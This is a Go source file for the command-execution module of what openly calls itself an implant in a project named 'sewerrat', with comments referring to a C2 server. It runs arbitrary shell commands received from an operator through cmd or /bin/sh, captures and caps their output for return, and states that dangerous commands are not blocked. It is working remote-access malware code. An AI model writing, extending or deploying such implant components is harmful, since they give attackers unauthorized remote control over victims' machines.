package implant

import (
	"bytes"
	"context"
	"fmt"
//	"log"
// 	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"sewerrat/shared"
)

// CommandExecutor handles system command execution with timeout and output capture
type CommandExecutor struct {
	timeout time.Duration
}

// NewCommandExecutor creates a new executor with specified timeout
func NewCommandExecutor(timeoutSeconds int) *CommandExecutor {
	return &CommandExecutor{
		timeout: time.Duration(timeoutSeconds) * time.Second,
	}
}

// Execute runs a command and captures output
// Returns stdout + stderr combined (limited to MaxResponseSize from shared)
func (ce *CommandExecutor) Execute(command string) (string, error) {
	// Sanitize command - remove trailing/leading whitespace
	command = strings.TrimSpace(command)
	if command == "" {
		return "", fmt.Errorf("empty command")
	}

	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), ce.timeout)
	defer cancel()

	var cmd *exec.Cmd

	// Platform-specific command wrapping
	if runtime.GOOS == "windows" {
		// Windows: use cmd /c to execute
		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
	} else {
		// Linux/Unix: use sh -c to execute
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}

	// Capture both stdout and stderr
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Run command
	err := cmd.Run()

	// Combine output (stderr first if present, then stdout)
	output := stdout.String()
	if stderr.Len() > 0 {
		output = stderr.String() + output
	}

	// If command timed out
	if ctx.Err() == context.DeadlineExceeded {
		output = fmt.Sprintf("[TIMEOUT] Command did not complete within %d seconds\n%s", 
			int(ce.timeout.Seconds()), output)
	} else if err != nil {
		// Include error in output if command failed
		output = fmt.Sprintf("[ERROR] %v\n%s", err, output)
	}

	// Cap output to MaxResponseSize
	if len(output) > shared.MaxResponseSize {
		output = output[:shared.MaxResponseSize]
	}

	return output, nil
}

// ExecuteAsync runs a command asynchronously and sends result through channel
func (ce *CommandExecutor) ExecuteAsync(command string) <-chan string {
	resultCh := make(chan string, 1)

	go func() {
		result, _ := ce.Execute(command)
		resultCh <- result
	}()

	return resultCh
}

// ValidateCommand checks if command string is valid
// This is a basic sanity check; dangerous commands are NOT blocked
func (ce *CommandExecutor) ValidateCommand(command string) bool {
	if len(command) == 0 || len(command) > 1024 {
		return false
	}
	return true
}

// GetCommandExecutionSummary returns a summary of what was executed
// Useful for internal logging (not sent to C2)
func GetCommandExecutionSummary(command, output string) string {
	outputPreview := output
	if len(outputPreview) > 100 {
		outputPreview = outputPreview[:100] + "..."
	}

	return fmt.Sprintf("[EXEC] Command: %s | Output Length: %d bytes", 
		command, len(output))
}
